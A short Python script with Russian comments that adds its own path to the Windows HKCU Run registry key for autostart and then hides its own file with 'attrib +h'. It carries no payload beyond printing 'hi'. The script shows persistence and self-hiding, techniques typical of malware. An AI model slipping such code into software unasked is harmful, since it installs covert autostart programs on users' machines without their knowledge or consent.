import os
import subprocess
import winreg


def add_to_startup(file_path):
    try:
        # Открываем ключ реестра для автозагрузки
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                             winreg.KEY_ALL_ACCESS)

        # Создаем новое значение для нашей программы
        winreg.SetValueEx(key, "MyProgram", 0, winreg.REG_SZ, file_path)

        # Закрываем ключ
        winreg.CloseKey(key)
        print("Программа добавлена в автозагрузку.")
    except Exception as e:
        print("Ошибка при добавлении в автозагрузку:", e)


def hide_file(file_path):
    try:
        # Выполняем команду attrib +h для скрытия файла
        subprocess.call(['attrib', '+h', file_path])
        print("Файл успешно скрыт.")
    except Exception as e:
        print("Ошибка при скрытии файла:", e)


def main():
    print('hi')

    # Получаем путь к текущему исполняемому файлу
    current_path = os.path.abspath(__file__)

    # Добавляем программу в автозагрузку
    add_to_startup(current_path)

    # Скрываем файл
    hide_file(current_path)


if __name__ == '__main__':
    main()
